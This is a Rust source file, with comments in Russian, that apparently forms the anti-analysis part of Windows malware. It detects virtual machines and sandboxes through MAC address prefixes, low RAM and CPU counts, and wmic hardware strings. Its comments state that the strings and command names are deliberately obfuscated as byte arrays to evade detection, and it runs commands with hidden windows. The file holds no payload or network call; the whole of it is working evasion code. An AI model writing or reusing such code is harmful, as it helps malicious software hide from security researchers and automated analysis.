use sysinfo::System;
use std::process::Command;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;

// MAC-адреса виртуалок, декриптуем в рантайме
pub fn check_mac_addresses() -> bool {
    let vm_macs_enc: &[&[u8]] = &[
        &[48, 48, 45, 48, 53, 45, 54, 57], // 00-05-69 VMware
        &[48, 48, 45, 48, 67, 45, 50, 57], // 00-0C-29 VMware
        &[48, 48, 45, 49, 67, 45, 49, 52], // 00-1C-14 VMware
        &[48, 48, 45, 53, 48, 45, 53, 54], // 00-50-56 VMware
        &[48, 56, 45, 48, 48, 45, 50, 55], // 08-00-27 VirtualBox
        &[48, 48, 45, 49, 67, 45, 52, 50], // 00-1C-42 Parallels
        &[48, 48, 45, 49, 54, 45, 51, 69], // 00-16-3E Xen
    ];

    let mut bad_macs = Vec::new();
    for enc_mac in vm_macs_enc {
        let mac: String = enc_mac.iter().map(|&b| b as char).collect();
        bad_macs.push(mac);
    }

    // команду тоже обфусцируем
    let cmd_parts: &[u8] = &[105u8, 112, 99, 111, 110, 102, 105, 103]; // "ipconfig"
    let cmd: String = cmd_parts.iter().map(|&b| (b as u8) as char).collect();

    let arg_parts: &[u8] = &[47u8, 97, 108, 108]; // "/all"
    let arg: String = arg_parts.iter().map(|&b| (b as u8) as char).collect();

    if let Ok(output) = Command::new(cmd)
        .arg(arg)
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout).to_uppercase();

        for mac in bad_macs.iter() {
            if stdout.contains(mac) {
                return true;
            }
        }
    }
    false
}

// меньше 2 гиг рам - подозрительно
pub fn check_ram() -> bool {
    let mut sys = System::new_all();
    sys.refresh_memory();
    let total_memory = sys.total_memory();

    total_memory < 2 * 1024 * 1024 * 1024
}

// меньше 2 ядер - подозрительно
pub fn check_cpu_cores() -> bool {
    let mut sys = System::new_all();
    sys.refresh_cpu_usage();
    let cores = sys.cpus().len();

    cores < 2
}

// запускаем wmic и возвращаем вывод
fn run_wmic(cmd: &str) -> String {
    let args: Vec<&str> = cmd.split_whitespace().collect();
    if let Ok(output) = Command::new("wmic")
        .args(&args)
        .creation_flags(CREATE_NO_WINDOW)
        .output()
    {
        String::from_utf8_lossy(&output.stdout).to_string()
    } else {
        String::new()
    }
}

// wmic эвристика по железу (диск, клавиатура, мышь, проц)
pub fn check_wmic_heuristics() -> bool {
    let mut total_index = 0;

    // строки декриптуем в рантайме
    let disk_model: String = vec![87u8, 68, 67, 32, 87, 68, 83, 49, 48, 48, 84, 50, 66, 48, 65]
        .iter().map(|&b| b as char).collect();
    let disk_serial: String = vec![50u8, 51, 50, 49, 51, 56, 56, 48, 52, 49, 54, 53]
        .iter().map(|&b| b as char).collect();
    let kbd_id: String = vec![65u8, 67, 80, 73, 92, 80, 78, 80, 48, 51, 48, 51, 92, 52, 38, 50, 50, 70, 53, 56, 50, 57, 69, 38, 48]
        .iter().map(|&b| b as char).collect();
    let kbd_desc: String = vec![83u8, 116, 97, 110, 100, 97, 114, 100, 32, 80, 83, 47, 50, 32, 75, 101, 121, 98, 111, 97, 114, 100]
        .iter().map(|&b| b as char).collect();
    let mouse_id: String = vec![65u8, 67, 80, 73, 92, 80, 78, 80, 48, 70, 49, 51, 92, 52, 38, 50, 50, 70, 53, 56, 50, 57, 69, 38, 48]
        .iter().map(|&b| b as char).collect();
    let cpu_vm: String = vec![73u8, 110, 116, 101, 108, 32, 67, 111, 114, 101, 32, 80, 114, 111, 99, 101, 115, 115, 111, 114]
        .iter().map(|&b| b as char).collect();

    let disk_info = run_wmic("diskdrive get model,serialnumber");
    if disk_info.contains(&disk_model) {
        total_index += 1;
        if disk_info.contains(&disk_serial) { total_index += 1; }
    }

    let kbd_info = run_wmic("path Win32_Keyboard get Description,DeviceID");
    if kbd_info.contains(&kbd_id) {
        total_index += 1;
        if kbd_info.contains(&kbd_desc) { total_index += 1; }
    }

    let mouse_info = run_wmic("path Win32_PointingDevice get Description,PNPDeviceID");
    if mouse_info.contains(&mouse_id) {
        total_index += 1;
    }

    let cpu_info = run_wmic("cpu get name");
    if cpu_info.contains(&cpu_vm) {
        total_index += 1;
    }

    // 5+ признаков — виртуалка
    total_index >= 5
}
